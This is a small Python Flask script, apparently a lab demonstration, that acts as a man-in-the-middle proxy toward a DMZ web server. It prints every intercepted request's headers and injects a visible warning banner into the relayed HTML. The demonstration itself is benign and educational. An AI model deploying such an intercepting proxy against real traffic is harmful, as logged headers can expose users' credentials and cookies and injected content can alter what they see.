from flask import Flask, request, Response
import requests
import os

app = Flask(__name__)

TARGET_DMZ = os.getenv("TARGET_DMZ", "https://servidor-web-dmz-adrianysmaria.onrender.com")

@app.route('/', defaults={'path': ''}, methods=['GET', 'POST'])
@app.route('/<path:path>', methods=['GET', 'POST'])
def mitm_proxy(path):
    print(f"\n[MITM INTERCEPTADO] Petición entrante hacia la ruta: /{path}")
    print(f"[CABECERAS INTERCEPTADAS] {dict(request.headers)}")
    
    url = f"{TARGET_DMZ}/{path}" if path else TARGET_DMZ
    try:
        resp = requests.get(url, timeout=10)
        contenido_original = resp.text
    except Exception as e:
        contenido_original = f"Error al conectar con la DMZ ({TARGET_DMZ}): {str(e)}"
    
    # Inyección de código en la respuesta HTTP
    alerta_html = (
        "<div style='background-color:#fee2e2;border:2px solid #ef4444;color:#991b1b;padding:15px;margin:20px;border-radius:8px;font-family:sans-serif;'>"
        "<h3>⚠️ [ALERTA DE SEGURIDAD - PROXY MITM INTERCEPTOR]</h3>"
        "<p>Este contenido fue <strong>interceptado y alterado en tránsito</strong> por el Proxy Adversario (Man-In-The-Middle).</p>"
        "<p><em>Demostración de vulnerabilidad en canales no protegidos con cifrado estricto de extremo a extremo.</em></p>"
        "</div>"
    )
    contenido_alterado = alerta_html + contenido_original
    
    print("[MITM ALERTA] Respuesta modificada e inyectada con éxito.")
    return Response(contenido_alterado, status=200, mimetype='text/html')

if __name__ == '__main__':
    print(f"Iniciando Proxy MITM apuntando a {TARGET_DMZ}...")
    app.run(host='0.0.0.0', port=8080)
